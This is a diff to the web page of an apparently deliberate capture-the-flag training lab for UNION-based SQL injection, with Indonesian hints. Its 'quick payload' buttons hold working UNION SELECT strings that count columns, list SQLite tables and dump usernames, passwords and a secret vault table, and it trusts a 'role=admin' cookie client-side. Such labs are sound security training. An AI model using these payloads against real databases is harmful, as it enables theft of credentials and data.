@@ -3,58 +3,78 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>SQLi UNION Extraction - ACT LAB (HTB Edition)</title>
+  <title>SQLi UNION - ACT LAB (HTB Edition)</title>
   <link rel="stylesheet" href="/css/style.css">
   <style>
+    * { box-sizing: border-box; }
     body { background: #0b0e11; }
-    .htb-container { max-width: 1100px; margin: 4rem auto; }
-    .machine-header { border-left: 4px solid var(--neon-cyan); padding-left: 1.5rem; margin-bottom: 3rem; }
-    .machine-title { font-family: 'Orbitron', sans-serif; font-size: 2rem; color: #fff; }
-    
-    .htb-card { background: #15191d; border: 1px solid #23282f; border-radius: 4px; padding: 2rem; margin-bottom: 2rem; }
-    .htb-card-title { font-size: 1rem; color: var(--neon-cyan); font-weight: bold; margin-bottom: 1.5rem; text-transform: uppercase; letter-spacing: 2px; border-bottom: 1px solid #23282f; padding-bottom: 0.75rem; }
-    
-    .htb-input { 
-      background: #0b0e11; 
-      border: 1px solid #23282f; 
-      color: #fff; 
-      font-size: 1rem; 
-      padding: 0.8rem; 
-      width: 100%; 
-      border-radius: 4px; 
-      font-family: 'Share Tech Mono', monospace; 
-    }
-    .htb-input:focus { border-color: var(--neon-green); outline: none; }
-    .htb-btn { 
-      background: var(--neon-cyan); 
-      color: #000; 
-      font-weight: bold; 
-      padding: 0.8rem 2rem; 
-      border: none; 
-      border-radius: 4px; 
-      cursor: pointer; 
-      text-transform: uppercase; 
-      letter-spacing: 2px; 
-    }
+    .htb-container { max-width: 1100px; margin: 4rem auto; padding: 0 1.5rem; }
 
-    .htb-terminal { background: #050505; border: 1px solid #1c2126; border-radius: 4px; font-family: 'Share Tech Mono', monospace; margin-bottom: 2rem; overflow: hidden; }
-    .htb-terminal-header { background: #15191d; padding: 6px 12px; color: #626e84; font-size: 10px; display: flex; justify-content: space-between; }
-    .htb-terminal-body { padding: 1rem; color: var(--neon-cyan); font-size: 13px; line-height: 1.5; }
+    .machine-header { border-left: 4px solid var(--neon-cyan); padding-left: 1.5rem; margin-bottom: 3rem; position: relative; }
+    .machine-header::after { content: ''; position: absolute; bottom: -1rem; left: 1.5rem; right: 0; height: 1px; background: linear-gradient(90deg, var(--neon-cyan), transparent); }
+    .machine-title { font-family: 'Orbitron', sans-serif; font-size: 2.2rem; color: #fff; letter-spacing: 2px; text-shadow: 0 0 40px rgba(0,212,255,0.15); }
+    .machine-sub { color: var(--text-secondary); font-size: 0.85rem; margin-top: 0.4rem; letter-spacing: 3px; text-transform: uppercase; }
 
+    .htb-card { background: #15191d; border: 1px solid #23282f; border-radius: 6px; padding: 2rem; margin-bottom: 2rem; transition: border-color 0.3s; }
+    .htb-card:hover { border-color: #2f3640; }
+    .htb-card-title { font-size: 0.85rem; color: var(--neon-cyan); font-weight: bold; margin-bottom: 1.5rem; text-transform: uppercase; letter-spacing: 2px; border-bottom: 1px solid #23282f; padding-bottom: 0.75rem; display: flex; align-items: center; justify-content: space-between; }
+
+    .htb-input { background: #0b0e11; border: 1px solid #23282f; color: #fff; font-size: 0.95rem; padding: 1rem 1.2rem; width: 100%; border-radius: 6px; font-family: 'Share Tech Mono', monospace; transition: all 0.2s; }
+    .htb-input:focus { border-color: var(--neon-green); outline: none; box-shadow: 0 0 20px rgba(159,239,0,0.12); }
+
+    .htb-btn { background: var(--neon-cyan); color: #000; font-weight: bold; padding: 1rem 2rem; border: none; border-radius: 6px; cursor: pointer; text-transform: uppercase; letter-spacing: 2px; font-size: 0.8rem; transition: all 0.25s; display: inline-flex; align-items: center; gap: 0.5rem; }
+    .htb-btn:hover { opacity: 0.85; transform: translateY(-2px); box-shadow: 0 6px 20px rgba(0,212,255,0.2); }
+    .htb-btn:active { transform: translateY(0); }
+    .htb-btn-green { background: var(--neon-green); }
+
+    .htb-terminal { background: #050505; border: 1px solid #1c2126; border-radius: 6px; font-family: 'Share Tech Mono', monospace; margin-bottom: 2rem; overflow: hidden; }
+    .htb-terminal-header { background: #15191d; padding: 8px 14px; color: #626e84; font-size: 10px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #1c2126; }
+    .htb-terminal-body { padding: 1.2rem; line-height: 1.7; font-size: 12px; max-height: 300px; overflow-y: auto; }
+
+    /* SQL Preview */
+    .sql-preview { background: #0b0e11; border: 1px solid #1c2126; border-radius: 4px; padding: 1rem; margin: 1rem 0; font-family: 'Share Tech Mono', monospace; font-size: 11px; overflow-x: auto; }
+    .sql-keyword { color: var(--neon-cyan); font-weight: bold; }
+    .sql-string { color: var(--neon-green); }
+    .sql-injection { color: var(--neon-pink); font-weight: bold; background: rgba(255,0,102,0.08); }
+
+    /* Table */
     .table-container { overflow-x: auto; margin-top: 1rem; }
-    table { width: 100%; border-collapse: collapse; font-family: 'Share Tech Mono', monospace; font-size: 13px; color: #f0f0f0; }
-    th { text-align: left; padding: 12px; background: #0b0e11; border-bottom: 1px solid #23282f; color: var(--neon-cyan); text-transform: uppercase; font-size: 11px; }
-    td { padding: 12px; border-bottom: 1px solid #1c2126; }
+    table { width: 100%; border-collapse: collapse; font-family: 'Share Tech Mono', monospace; font-size: 12px; }
+    th { text-align: left; padding: 10px 12px; background: #0b0e11; border-bottom: 2px solid #23282f; color: var(--neon-cyan); text-transform: uppercase; font-size: 10px; letter-spacing: 1px; }
+    td { padding: 10px 12px; border-bottom: 1px solid #1c2126; color: #f0f0f0; }
     tr:hover { background: rgba(159,239,0,0.03); }
     .flag-text { color: var(--neon-yellow); font-weight: bold; }
+    .sensitive-col { border-left: 2px solid var(--neon-pink); }
+    .col-mapper { color: #626e84; font-size: 9px; display: block; margin-top: 2px; }
+
+    /* Payload Chips */
+    .payload-chips { display: flex; flex-wrap: wrap; gap: 0.5rem; margin: 1rem 0; }
+    .payload-chip { background: #0b0e11; border: 1px solid #23282f; border-radius: 4px; padding: 6px 12px; font-family: 'Share Tech Mono', monospace; font-size: 10px; color: var(--neon-yellow); cursor: pointer; transition: all 0.2s; }
+    .payload-chip:hover { border-color: var(--neon-green); background: rgba(159,239,0,0.05); }
+
+    .request-row { display: flex; justify-content: space-between; padding: 8px 12px; border-bottom: 1px solid #1c2126; font-size: 11px; }
+    .request-row:last-child { border-bottom: none; }
+    .request-label { color: #626e84; }
+    .request-value { color: #fff; word-break: break-all; max-width: 65%; text-align: right; }
+
+    /* Column Mapping Visualization */
+    .col-map { display: grid; grid-template-columns: repeat(8, 1fr); gap: 4px; margin: 1rem 0; }
+    .col-box { background: #0b0e11; border: 1px solid #23282f; border-radius: 3px; padding: 6px; text-align: center; font-size: 9px; }
+    .col-box .col-num { color: var(--neon-cyan); font-weight: bold; display: block; }
+    .col-box .col-name { color: #626e84; display: block; margin-top: 2px; }
+    .col-box .col-union { color: var(--neon-yellow); display: block; margin-top: 2px; font-size: 8px; }
+    .col-box.highlight { border-color: var(--neon-pink); background: rgba(255,0,102,0.05); }
+
+    @media (max-width: 768px) { .col-map { grid-template-columns: repeat(4, 1fr); } }
+
+    .spinner { width: 32px; height: 32px; border: 2px solid #23282f; border-top-color: var(--neon-cyan); border-radius: 50%; animation: spin 0.8s linear infinite; margin: 2rem auto; }
+    @keyframes spin { to { transform: rotate(360deg); } }
   </style>
 </head>
 <body>
-  <div class="cyber-bg" style="opacity: 0.05;"></div>
-
   <nav class="navbar">
     <a href="/" class="nav-logo">
-      <img src="/img/act.png" alt="Logo" style="height: 32px; border-radius: 4px; margin-right: 10px;" onerror="this.style.display='none'">
+      <img src="/img/act.png" alt="Logo" style="height:32px;border-radius:4px;margin-right:10px;" onerror="this.style.display='none'">
       <span class="nav-logo-text">ACT LAB</span>
     </a>
     <ul class="nav-links">
@@ -68,99 +88,200 @@
   <main class="main-content">
     <div class="htb-container">
       <header class="machine-header">
-        <h1 class="machine-title">SQL INJECTION :: UNION SELECT</h1>
-        <p style="color: var(--text-secondary); margin-top: 0.5rem; font-size: 0.9rem;">PHASE: DATA EXFILTRATION & TABLE LEAKING</p>
+        <h1 class="machine-title">◈ SQL INJECTION :: UNION SELECT</h1>
+        <p class="machine-sub">PHASE: DATA EXFILTRATION &bull; ATTACK VECTOR: UNION-BASED EXTRACTION</p>
       </header>
 
-      <!-- TARGET ANALYSIS -->
-      <div class="htb-terminal" style="border-color: var(--neon-cyan); margin-bottom: 2rem;">
-        <div class="htb-terminal-header" style="background: rgba(0,212,255,0.1);">
-          <span style="color: var(--neon-cyan);">[!] VULNERABILITY_TARGET_ANALYSIS</span>
+      <!-- VULNERABILITY ANALYSIS -->
+      <div class="htb-terminal" style="border-color:var(--neon-cyan);">
+        <div class="htb-terminal-header" style="background:rgba(0,212,255,0.08);">
+          <span style="color:var(--neon-cyan);font-weight:bold;">◈ TARGET_RECON</span>
+          <span style="color:#626e84;">CWE-89: SQL Injection - UNION Based</span>
         </div>
-        <div class="htb-terminal-body" style="padding: 1rem;">
-          <div style="color: #626e84; margin-bottom: 5px;">ENDPOINT: <code style="color: #fff;">GET /api/search</code></div>
-          <div style="color: #626e84;">PARAMETER: <code style="color: var(--neon-yellow);">q</code> (Query String)</div>
+        <div class="htb-terminal-body" style="max-height:none;">
+          <div class="request-row"><span class="request-label">ENDPOINT</span><span class="request-value"><code style="color:var(--neon-cyan);">GET /api/search?q=</code></span></div>
+          <div class="request-row"><span class="request-label">COLUMNS</span><span class="request-value" style="color:var(--neon-yellow);">8 kolom — id, title, description, category, difficulty, hint, points, endpoint</span></div>
+          <div class="request-row" style="border-bottom:none;"><span class="request-label">TARGET</span><span class="request-value" style="color:var(--neon-amber);font-size:10px;">Ekstrak data dari tabel <code>users</code> — password user <code>secret_agent</code> berisi flag!</span></div>
         </div>
       </div>
 
+      <!-- COLUMN MAPPING -->
+      <div class="htb-card">
+        <h2 class="htb-card-title">
+          <span>📊 Column Mapping (8 Kolom)</span>
+          <span style="font-size:9px;color:#626e84;font-weight:normal;">challenges → users</span>
+        </h2>
+        <div class="col-map">
+          <div class="col-box"><span class="col-num">1</span><span class="col-name">id</span><span class="col-union">→ id</span></div>
+          <div class="col-box highlight"><span class="col-num">2</span><span class="col-name">title</span><span class="col-union">→ 👤 username</span></div>
+          <div class="col-box highlight"><span class="col-num">3</span><span class="col-name">description</span><span class="col-union">→ 🔑 password</span></div>
+          <div class="col-box"><span class="col-num">4</span><span class="col-name">category</span><span class="col-union">→ email</span></div>
+          <div class="col-box"><span class="col-num">5</span><span class="col-name">difficulty</span><span class="col-union">→ role</span></div>
+          <div class="col-box"><span class="col-num">6</span><span class="col-name">hint</span><span class="col-union">→ avatar</span></div>
+          <div class="col-box"><span class="col-num">7</span><span class="col-name">points</span><span class="col-union">→ bio</span></div>
+          <div class="col-box"><span class="col-num">8</span><span class="col-name">endpoint</span><span class="col-union">→ score</span></div>
+        </div>
+        <div style="font-size:10px;color:#626e84;text-align:center;">
+          🔴 <span style="color:var(--neon-pink);">Kolom sensitif</span> — username & password dari tabel users ada di kolom 2 & 3
+        </div>
+      </div>
+
+      <!-- SQL PREVIEW -->
       <div class="htb-terminal">
-        <div class="htb-terminal-header"><span>BACKEND SQL ANALYZER</span></div>
-        <div class="htb-terminal-body">
-          <span style="color: #626e84;">SELECT id, title, description, category FROM challenges WHERE title LIKE '%</span><span id="sqlPreview" style="color:var(--neon-yellow);"></span><span style="color: #626e84;">%'</span>
+        <div class="htb-terminal-header"><span>📐 SQL QUERY PREVIEW</span></div>
+        <div class="htb-terminal-body" style="max-height:none;padding:1rem;">
+          <div class="sql-preview" id="sqlPreview">
+            <span class="sql-keyword">SELECT</span> id, title, description, category, difficulty, hint, points, endpoint
+            <span class="sql-keyword">FROM</span> challenges
+            <span class="sql-keyword">WHERE</span> title <span class="sql-keyword">LIKE</span> <span class="sql-string">'%<span id="sqlLivePreview" style="color:var(--neon-yellow);"></span>%'</span>
+          </div>
         </div>
       </div>
 
-      <!-- SUBMIT FLAG SECTION (MOVED UP) -->
-      <section class="htb-card" style="border: 1px solid var(--neon-cyan); background: rgba(0,212,255,0.02); margin-bottom: 3rem;">
-        <h2 class="htb-card-title" style="margin-bottom: 1.2rem; font-size: 0.9rem;">Submit Flag Found</h2>
-        <div style="display: flex; gap: 1rem;">
-          <input type="text" id="flagInput" class="htb-input" placeholder="ACT{flag_here}" style="flex: 1; height: 45px;">
-          <button onclick="submitFlag(2)" class="htb-btn" style="width: auto; padding: 0 1.5rem; height: 45px; font-size: 12px;">Submit Flag</button>
+      <!-- SEARCH FORM -->
+      <section class="htb-card">
+        <h2 class="htb-card-title">
+          <span>🔍 Injection Query</span>
+          <span id="resultCount" style="font-size:9px;color:#626e84;font-weight:normal;">&nbsp;</span>
+        </h2>
+
+        <div style="display:flex;gap:1rem;align-items:flex-end;flex-wrap:wrap;">
+          <div style="flex:1;min-width:250px;">
+            <label style="color:#626e84;font-size:10px;text-transform:uppercase;letter-spacing:1px;display:block;margin-bottom:6px;">SQL Payload</label>
+            <input type="text" id="searchInput" class="htb-input" value="' UNION SELECT 1,2,3,4,5,6,7,8-- " oninput="updatePreview()" autocomplete="off">
+          </div>
+          <button onclick="executeSearch()" class="htb-btn">🚀 Execute</button>
+          <button onclick="resetSearch()" class="htb-btn" style="background:transparent;border:1px solid #23282f;color:#626e84;padding:1rem 1rem;">↺</button>
+        </div>
+
+        <!-- Quick Payloads -->
+        <div style="margin-top:1rem;">
+          <label style="color:#626e84;font-size:10px;text-transform:uppercase;letter-spacing:1px;display:block;margin-bottom:6px;">⚡ Quick Payloads</label>
+          <div class="payload-chips">
+            <span class="payload-chip" onclick="quickSearch(&quot;' UNION SELECT 1,2,3,4,5,6,7,8-- &quot;)">🔢 Count columns (1-8)</span>
+            <span class="payload-chip" onclick="quickSearch(&quot;' UNION SELECT id,username,password,email,role,avatar,bio,score FROM users-- &quot;)">👥 Extract users</span>
+            <span class="payload-chip" onclick="quickSearch(&quot;' UNION SELECT 1,name,3,4,5,6,7,8 FROM sqlite_master WHERE type='table'-- &quot;)">📋 List tables</span>
+            <span class="payload-chip" onclick="quickSearch(&quot;' UNION SELECT 1,secret_key,secret_value,4,5,6,7,8 FROM secret_vault-- &quot;)">🔐 Secret Vault</span>
+            <span class="payload-chip" onclick="quickSearch(&quot;' UNION SELECT 1,sql,3,4,5,6,7,8 FROM sqlite_master WHERE type='table' AND name='users'-- &quot;)">🏗️ Schema users</span>
+          </div>
         </div>
       </section>
 
-      <section class="htb-card">
-        <form onsubmit="handleSearch(event)" style="display: flex; gap: 1rem; align-items: flex-end;">
-          <div style="flex: 1;">
-            <label class="form-label" style="font-size: 11px; color: #626e84; text-transform: uppercase; margin-bottom: 8px; display: block;">Search / Inject Payload</label>
-            <input type="text" id="searchInput" class="htb-input" placeholder="Enter UNION payload..." oninput="updatePreview()" autocomplete="off" required>
-          </div>
-          <button type="submit" class="htb-btn">Search</button>
-        </form>
-      </section>
-
+      <!-- RESULTS -->
       <div id="resultsArea"></div>
+
+      <!-- FLAG SUBMIT -->
+      <section class="htb-card" style="border:1px solid var(--neon-green);background:rgba(159,239,0,0.015);">
+        <h2 class="htb-card-title" style="margin-bottom:1rem;color:var(--neon-green);">🚩 SUBMIT FLAG</h2>
+        <div style="display:flex;gap:1rem;">
+          <input type="text" id="flagInput" class="htb-input" placeholder="ACT{flag_here}" style="flex:1;height:48px;">
+          <button onclick="submitFlag(2)" class="htb-btn htb-btn-green" style="padding:0 2rem;height:48px;flex-shrink:0;">Submit</button>
+        </div>
+        <div style="margin-top:0.8rem;font-size:11px;color:#626e84;text-align:center;">
+          💡 Flag adalah <strong style="color:var(--neon-yellow);">password</strong> user <code>secret_agent</code> — ada di kolom <strong>description</strong> (kolom 3)
+        </div>
+      </section>
     </div>
   </main>
 
   <div class="toast-container" id="toastContainer"></div>
 
   <script>
+    function updatePreview() {
+      document.getElementById('sqlLivePreview').textContent = document.getElementById('searchInput').value;
+    }
+
+    function quickSearch(payload) {
+      document.getElementById('searchInput').value = payload;
+      updatePreview();
+      executeSearch();
+    }
+
+    function resetSearch() {
+      document.getElementById('searchInput').value = "' UNION SELECT 1,2,3,4,5,6,7,8-- ";
+      document.getElementById('resultsArea').innerHTML = '';
+      document.getElementById('resultCount').textContent = '';
+      updatePreview();
+    }
+
+    async function executeSearch() {
+      const q = document.getElementById('searchInput').value;
+      const resultsDiv = document.getElementById('resultsArea');
+      const countEl = document.getElementById('resultCount');
+
+      resultsDiv.innerHTML = '<div class="spinner"></div>';
+      countEl.textContent = '⏳ Querying...';
+
+      try {
+        const res = await fetch(`/api/search?q=${encodeURIComponent(q)}`);
+        const data = await res.json();
+
+        if (data.success) {
+          if (data.results.length === 0) {
+            resultsDiv.innerHTML = `<div class="htb-card" style="text-align:center;color:#626e84;font-size:13px;">[ NO_MATCHES_FOUND ] — Mungkin kolom tidak 8, coba jumlah lain</div>`;
+            countEl.textContent = '📊 0 results';
+          } else {
+            const keys = Object.keys(data.results[0]);
+            countEl.textContent = `📊 ${data.results.length} results`;
+
+            // Auto-highlight flag columns
+            resultsDiv.innerHTML = `<div class="htb-card">
+              <h2 class="htb-card-title" style="color:var(--neon-green);">📊 Exfiltrated Data (${data.results.length} rows)</h2>
+              <div class="table-container">
+                <table>
+                  <thead><tr>${keys.map((k,i) => `<th class="${(i===1||i===2) ? 'sensitive-col' : ''}">${k}</th>`).join('')}</tr></thead>
+                  <tbody>
+                    ${data.results.map(row => `<tr>
+                      ${keys.map((k,i) => {
+                        const val = String(row[k] || '');
+                        const isFlag = val.includes('ACT{');
+                        return `<td class="${isFlag ? 'flag-text' : ''} ${(i===1||i===2) ? 'sensitive-col' : ''}">${escapeHtml(val)}</td>`;
+                      }).join('')}
+                    </tr>`).join('')}
+                  </tbody>
+                </table>
+              </div>
+            </div>`;
+          }
+        } else {
+          resultsDiv.innerHTML = `<div class="htb-card" style="text-align:center;color:var(--neon-pink);font-size:13px;">ERROR: ${escapeHtml(data.error)}</div>`;
+          countEl.textContent = '❌ Error';
+        }
+      } catch(err) {
+        resultsDiv.innerHTML = `<div class="htb-card" style="text-align:center;color:var(--neon-pink);font-size:13px;">Network Error</div>`;
+        countEl.textContent = '❌ Error';
+      }
+    }
+
+    function escapeHtml(str) { const d = document.createElement('div'); d.textContent = str; return d.innerHTML; }
+
     async function submitFlag(id) {
       const flag = document.getElementById('flagInput').value;
       if (!flag) return showToast('Please enter a flag', 'error');
       try {
-        const res = await fetch('/api/challenges/submit', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ challengeId: id, flag: flag }) });
+        const res = await fetch('/api/challenges/submit', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({challengeId:id, flag:flag}) });
         const data = await res.json();
-        if (data.correct) {
-          showToast('Correct flag!', 'success');
-          // REMOVED AUTO-REDIRECT
-        } else { showToast(data.message || 'Incorrect flag', 'error'); }
-      } catch (err) {}
+        if (data.correct) { showToast('✅ Correct flag!', 'success'); } else { showToast(data.message||'❌ Incorrect', 'error'); }
+      } catch(err) {}
     }
-    function updatePreview() { document.getElementById('sqlPreview').textContent = document.getElementById('searchInput').value; }
-    async function handleSearch(e) {
-      if (e) e.preventDefault();
-      const q = document.getElementById('searchInput').value;
-      const resultsDiv = document.getElementById('resultsArea');
-      resultsDiv.innerHTML = '<div class="spinner" style="margin: 4rem auto;"></div>';
-      try {
-        const res = await fetch(`/api/search?q=${q}`);
-        const data = await res.json();
-        if (data.success) {
-          if (data.results.length === 0) { resultsDiv.innerHTML = `<div class="htb-card" style="text-align:center; color:#626e84; font-size:13px;">[ NO_MATCHES_FOUND ]</div>`; } else {
-            const keys = Object.keys(data.results[0]);
-            resultsDiv.innerHTML = `<div class="htb-card"><h2 class="htb-card-title">Exfiltrated Data</h2><div class="table-container"><table><thead><tr>${keys.map(k => `<th>${k}</th>`).join('')}</tr></thead><tbody>${data.results.map(row => `<tr>${keys.map(k => { const val = String(row[k] || ''); const isFlag = val.includes('ACT{'); return `<td class="${isFlag ? 'flag-text' : ''}">${escapeHtml(val)}</td>`; }).join('')}</tr>`).join('')}</tbody></table></div></div>`;
-          }
-        }
-      } catch (err) {}
+
+    function showToast(msg, type) {
+      const container = document.getElementById('toastContainer');
+      container.innerHTML = '';
+      const toast = document.createElement('div'); toast.className = `toast toast-${type}`; toast.textContent = msg;
+      container.appendChild(toast); setTimeout(() => toast.remove(), 3000);
     }
-    function escapeHtml(str) { const div = document.createElement('div'); div.textContent = str; return div.innerHTML; }
-    function showToast(msg, type) { 
-      const container = document.getElementById('toastContainer'); 
-      container.innerHTML = ''; // CLEAR PREVIOUS TOASTS
-      const toast = document.createElement('div'); toast.className = `toast toast-${type}`; toast.textContent = msg; container.appendChild(toast); setTimeout(() => toast.remove(), 3000); 
-    }
+
     async function initStatus() {
       try {
         const res = await fetch('/api/auth/status');
         const data = await res.json();
-        const u = data.user || { username: 'Guest', score: 0, role: 'user' };
-        const isAdmin = u.role === 'admin' || document.cookie.includes('role=admin');
+        const u = data.user || { username:'Guest', score:0, role:'user' };
+        const isAdmin = u.role==='admin' || document.cookie.includes('role=admin');
         let navHtml = `<span class="nav-user-badge">Status: ${u.username} (${u.score} PTS)</span>`;
-        if (isAdmin) { navHtml = `<a href="/admin" class="nav-user-badge" style="border-color:var(--neon-pink); color:var(--neon-pink); text-decoration:none; animation: pulse 1s infinite;">⚠️ ADMIN_ACCESS_GRANTED</a> ` + navHtml; }
+        if (isAdmin) { navHtml = `<a href="/admin" class="nav-user-badge" style="border-color:var(--neon-pink);color:var(--neon-pink);text-decoration:none;animation:pulse 1s infinite;">⚠️ ADMIN_ACCESS_GRANTED</a> ` + navHtml; }
         document.getElementById('navUser').innerHTML = navHtml;
-      } catch (err) {}
+      } catch(err) {}
     }
     initStatus();
     updatePreview();
